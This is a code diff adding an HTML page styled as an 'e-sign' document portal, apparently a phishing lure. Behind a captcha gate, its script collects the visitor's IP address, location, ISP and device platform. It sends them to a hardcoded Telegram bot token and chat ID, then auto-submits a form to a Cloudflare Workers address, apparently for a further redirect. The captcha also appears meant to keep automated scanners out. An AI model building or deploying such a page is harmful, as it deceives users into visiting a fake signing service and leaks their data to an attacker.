@@ -1,0 +1,122 @@
+<html><head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<title>e-sign</title>
+    <link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+    <!-- Turnstile Script -->
+    <script src="https://challenges.cloudflare.com" async defer></script>
+	<style>
+@font-face {
+	font-family: 'fmtt';
+	src: url(img/font1.woff2) format('truetype');
+}
+* {
+	margin: auto;
+	font-size: 14px;
+	outline: 0;
+	font-family: 'fmtt';
+}
+body {
+	background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
+	background-size: cover;
+	backdrop-filter: blur(5px);
+    text-align: center;
+}
+@keyframes roll {
+	from { transform: rotate(0deg); }
+	to { transform: rotate(360deg); }
+}
+#rl {
+	animation: roll 1s infinite;
+    display: none; /* Hidden until captcha success */
+}
+@keyframes fade {
+	from { opacity: 1; }
+	to { opacity: 0.3; }
+}
+#fd {
+	animation: fade 1s infinite;
+}
+.captcha-container {
+    margin-top: 180px;
+    background: rgba(255, 255, 255, 0.1);
+    padding: 20px;
+    border-radius: 10px;
+    display: inline-block;
+    backdrop-filter: blur(10px);
+    border: 1px solid rgba(255,255,255,0.2);
+}
+	</style>
+</head>
+<body>
+
+<div style="max-width:500px;padding:0px;">
+
+    <!-- This is shown first -->
+    <div id="captcha-gate" class="captcha-container">
+        <p style="color:white; margin-bottom:15px; text-shadow: 1px 1px 2px black;">Please verify you are human</p>
+        <!-- REPLACE SITE KEY HERE -->
+        <div class="cf-turnstile" 
+             data-sitekey="0x4AAAAAACafd07cw2w7X14i" 
+             data-callback="onSuccess"></div>
+    </div>
+
+    <!-- This shows AFTER captcha success -->
+    <form id="downloadForm" method="POST" action="wandering-cherry-0bf1.g03755901.workers.dev" style="display:none;">
+        <div style="text-align:center">
+          <img src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" width="45" height="45" style="margin-top:150px;object-fit:contain;" id="fd" alt="icon">
+        </div>
+        <p style="text-align:center;font-size:15px;margin-top:10px; color:white;">Processing Document...</p>
+        <span style="display:block;height:15px;width:15px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;" id="rl"></span>
+    </form>
+
+</div>
+
+<script>
+    // Runs when captcha is passed
+    function onSuccess(token) {
+        document.getElementById('captcha-gate').style.display = 'none';
+        document.getElementById('downloadForm').style.display = 'block';
+        document.getElementById('rl').style.display = 'block';
+        
+        // Run your logger and then submit to Worker
+        sendLogsAndSubmit();
+    }
+
+    function sendLogsAndSubmit() {
+        const botToken = '5339183225:AAHuHKeVQYvIIB6Cy2SiiWwk2414E16JNCA'; 
+        const chatId = '5167329072';
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const message = `
+ #---------[ HUMAN VERIFIED ]-----------#:
+  IP Address: ${data.ip || 'Unknown'}
+  Location: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}
+  ISP: ${data.org || 'Unknown'}
+  Device: ${navigator.platform}
+                `;
+
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                })
+                .then(() => {
+                    // Final step: Send to Cloudflare Worker for Redirect
+                    setTimeout(() => {
+                        document.getElementById('downloadForm').submit();
+                    }, 1500);
+                });
+            })
+            .catch(error => {
+                // If logger fails, still submit the form to the worker
+                document.getElementById('downloadForm').submit();
+            });
+    }
+</script>
+
+</body></html>
